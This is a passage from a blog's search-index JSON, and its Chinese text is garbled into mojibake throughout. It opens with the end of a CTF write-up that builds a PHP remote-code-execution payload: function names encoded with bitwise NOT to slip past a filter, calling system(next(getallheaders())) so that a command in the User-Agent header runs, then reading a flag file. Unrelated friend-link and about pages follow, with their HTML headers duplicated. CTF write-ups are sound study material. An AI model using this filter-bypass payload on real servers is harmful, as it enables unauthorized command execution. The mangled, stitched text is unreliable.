çš„ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªç›¸å¯¹éšæœºçš„ 5 å­—ç¬¦é•¿çš„å­—ç¬¦ä¸²\n```\n\nå¯ä»¥çœ‹åˆ°è¿›è¡Œäº†é•¿åº¦é™åˆ¶å’Œè¿‡æ»¤ï¼Œå¹¶ä¸”é‚£ä¸ªmd5å€¼ä¹Ÿåœ¨å˜åŒ–ã€‚\n\n```php\nå‰ç½®çŸ¥è¯†ï¼š\n\n('phpinfo')()\n['phpinfo'][0]()\n['phpinfo']{0}()\næ•ˆæœä½œç”¨æ˜¯ä¸€æ ·çš„ã€‚\n\nphpinfo(): [~%8F%97%8F%96%91%99%90][~%CF]();\nåŠ è¿™ä¸ª[~%FF]åªæ˜¯å› ä¸ºphp7çš„è§£ææ–¹å¼ï¼Œå½“ç„¶æ¢æˆå…¶ä»–çš„ä¹Ÿå¯ä»¥ä¾‹å¦‚[~%EF] [~%CF]\n\ngetallheaders() è·å–æ‰€æœ‰ HTTP å¤´ä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ã€‚\nnext() è¯•å›¾å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚\n\nå‡è®¾ HTTP å¤´åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š\nArray\n(\n    [Host] => example.com\n    [User-Agent] => Mozilla/5.0\n    [Accept] => text/html\n    [Connection] => keep-alive\n)\nå½“ä½ æ‰§è¡Œ next(getallheaders()) æ—¶ï¼š\n\n<?php\n$headers = getallheaders(); // è·å–æ‰€æœ‰ HTTP å¤´ä¿¡æ¯\n$nextHeader = next($headers); // å°†æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼\necho $nextHeader;\n?>\nåœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ$nextHeader å°†åŒ…å« Mozilla/5.0ï¼Œå› ä¸ºè¿™æ˜¯æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ ã€‚\n```\n\nå› ä¸ºUAæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬åœ¨UAè¿›è¡ŒRCE\n\nç„¶åï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052054.png)\n\nåœ¨ç¬¬äºŒä½ï¼Œæ‰€ä»¥æ„é€ è¯­å¥æ‹¿åˆ°httpå¤´ï¼Œå¹¶ä¸”æ‰§è¡Œåœ¨UAä¸­çš„å‘½ä»¤\n\n```php\nå³ï¼šsystem(next(getallheaders()))\n```\n\nç„¶åï¼Œè¿›è¡Œå–åç»•è¿‡\n\n```\n[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052657.png)\n\næŸ¥çœ‹æ•ˆæœ\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053275.png)\n\nç„¶åï¼Œç›´æ¥cat /flll1114gggggg\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053789.png)\n\nå‚è€ƒï¼šhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"},{"title":"å‹é“¾","url":"/link/index.html","content":"\n<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ä¸ªäººèµ„æ–™</title>\n    <style>\n        body {\n            font-family: \"å¾®è½¯é›…é»‘\", Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            background-color: #f7f7f7;\n            color: #333;\n        }\n        .container {\n            width: 90%;\n            max-width: 1200px;\n            margin: 40px auto;\n            padding: 20px;\n        }\n        .profile-card {\n            display: flex;\n            align-items: center;\n            background-color: #fff;\n            margin-bottom: 20px;\n            padding: 20px;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            transition: transform 0.3s ease, box-shadow 0.3s ease;\n        }\n        .profile-card:hover {\n            transform: scale(1.05);\n            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);\n        }\n        .profile-card img {\n            width: 80px;\n            height: 80px;\n            border-radius: 50%;\n            object-fit: cover;\n            margin-right: 20px;\n        }\n        .profile-card .info {\n            display: flex;\n            flex-direction: column;\n        }\n        .profile-card .info a {\n            text-decoration: none;\n            color: #2a73cc;\n            font-size: 20px;\n            font-weight: bold;\n            margin-bottom: 10px;\n        }\n        .profile-card .info p {\n            margin: 5px 0;\n        }\n        .profile-card .info .descr {\n            font-size: 16px;\n            font-style: italic;\n            color: #666;\n        }\n        .profile-card .info .targs {\n            font-size: 14px;\n            color: #999;\n        }\n    </style>\n</head>\n<body>\n<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ä¸ªäººèµ„æ–™</title>\n    <style>\n        body {\n            font-family: \"å¾®è½¯é›…é»‘\", Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            background-color: #f7f7f7;\n            color: #333;\n        }\n        .container {\n            width: 90%;\n            max-width: 1200px;\n            margin: 40px auto;\n            padding: 20px;\n        }\n        .profile-card {\n            display: flex;\n            align-items: center;\n            background-color: #fff;\n            margin-bottom: 20px;\n            padding: 20px;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            transition: transform 0.3s ease, box-shadow 0.3s ease;\n        }\n        .profile-card:hover {\n            transform: scale(1.05);\n            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);\n        }\n        .profile-card img {\n            width: 80px;\n            height: 80px;\n            border-radius: 50%;\n            object-fit: cover;\n            margin-right: 20px;\n        }\n        .profile-card .info {\n            display: flex;\n            flex-direction: column;\n        }\n        .profile-card .info a {\n            text-decoration: none;\n            color: #2a73cc;\n            font-size: 20px;\n            font-weight: bold;\n            margin-bottom: 10px;\n        }\n        .profile-card .info p {\n            margin: 5px 0;\n        }\n        .profile-card .info .descr {\n            font-size: 16px;\n            font-style: italic;\n            color: #666;\n        }\n        .profile-card .info .targs {\n            font-size: 14px;\n            color: #999;\n        }\n    </style>\n</head>\n<body>\n<!DOCTYPE html>\n<html lang=\"zh\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ä¸ªäººèµ„æ–™</title>\n    <style>\n        body {\n            font-family: \"å¾®è½¯é›…é»‘\", Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            background-color: #f7f7f7;\n            color: #333;\n        }\n        .container {\n            width: 90%;\n            max-width: 1200px;\n            margin: 40px auto;\n            padding: 20px;\n        }\n        .profile-card {\n            display: flex;\n            align-items: center;\n            background-color: #fff;\n            margin-bottom: 20px;\n            padding: 20px;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            transition: transform 0.3s ease, box-shadow 0.3s ease;\n        }\n        .profile-card:hover {\n            transform: scale(1.05);\n            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);\n        }\n        .profile-card img {\n            width: 80px;\n            height: 80px;\n            border-radius: 50%;\n            object-fit: cover;\n            margin-right: 20px;\n        }\n        .profile-card .info {\n            display: flex;\n            flex-direction: column;\n        }\n        .profile-card .info a {\n            text-decoration: none;\n            color: #2a73cc;\n            font-size: 20px;\n            font-weight: bold;\n            margin-bottom: 10px;\n        }\n        .profile-card .info p {\n            margin: 5px 0;\n        }\n        .profile-card .info .descr {\n            font-size: 16px;\n            font-style: italic;\n            color: #666;\n        }\n        .profile-card .info .targs {\n            font-size: 14px;\n            color: #999;\n        }\n    </style>\n</head>\n<body>\n<div class=\"container\">\n    <!-- ä¸ªäººèµ„æ–™ 1 -->\n    <div class=\"profile-card\">\n        <img src=\"https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407102114048.jpeg\" alt=\"p0l1st Avatar\">\n        <div class=\"info\">\n            <a href=\"http://blog.p0l1st.top/\" target=\"_blank\">p0l1st</a>\n            <p class=\"descr\">åˆ«æ€¥ï¼Œåˆæ€¥</p>\n            <p class=\"targs\">Web</p>\n        </div>\n    </div>\n\t<div class=\"profile-card\">\n        <img src=\"https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202412132119611.jpg\" alt=\"CH13hh Avatar\">\n        <div class=\"info\">\n            <a href=\"https://ch13hh.github.io/\" target=\"_blank\">CH13hh</a>\n            <p class=\"descr\">The best way to predict the future is to create it.</p>\n            <p class=\"targs\">Pwn</p>\n        </div>\n    </div>\n    <div class=\"profile-card\">\n        <img src=\"https://yliken.github.io/img/essayhead/second.jpg\" alt=\"yliken Avatar\">\n        <div class=\"info\">\n            <a href=\"https://yliken.github.io/\" target=\"_blank\">yliken</a>\n            <p class=\"descr\">çº¢è±†ç”Ÿå—å›½ æ˜¥æ¥å‘å‡ æ æ„¿å›å¤šé‡‡æ’· æ­¤ç‰©æœ€ç›¸æ€</p>\n            <p class=\"targs\">Web</p>\n        </div>\n    </div>\n    <div class=\"profile-card\">\n        <img src=\"https://pfwqdxwdd.github.io/img/favicon.png\" alt=\"pfwqdxwdd Avatar\">\n        <div class=\"info\">\n            <a href=\"https://pfwqdxwdd.github.io/\" target=\"_blank\">pfwqdxwdd</a>\n            <p class=\"descr\">PWN!</p>\n            <p class=\"targs\">Pwn</p>\n        </div>\n    </div>\n    </div>\n    </body>\n    </html>\n\n\n\n\n\n"},{"title":"about","url":"/about/index.html","content":"\nNOthing................\n\n# \tfriends\n\nâ€‹\t[p0l1st](http://blog.p0l1st.top/) \tåˆ«æ€¥ï¼Œåˆæ€¥\ttagï¼šweb\n\nâ€‹\t[CH13hh](https://ch13hh.github.io/) \tThe best way to predict the future is to create it.\ttagï¼špwn\n\nâ€‹\t[yliken](https://yliken.github.io/)\tçº¢è±†ç”Ÿå—å›½ æ˜¥æ¥å‘å‡ æ æ„¿å›å¤šé‡‡æ’· æ­¤ç‰©æœ€ç›¸æ€\ttagï¼šweb\n\nâ€‹\t[pfwqdxwdd](https://pfwqdxwdd.github.io/)\tPWN!\ttagï¼špwn\n\nâ€‹\t\n\n"},{"title":"categories","url":"/categories/index.html"},{"title":"tags","url":"/tags/index.html"}]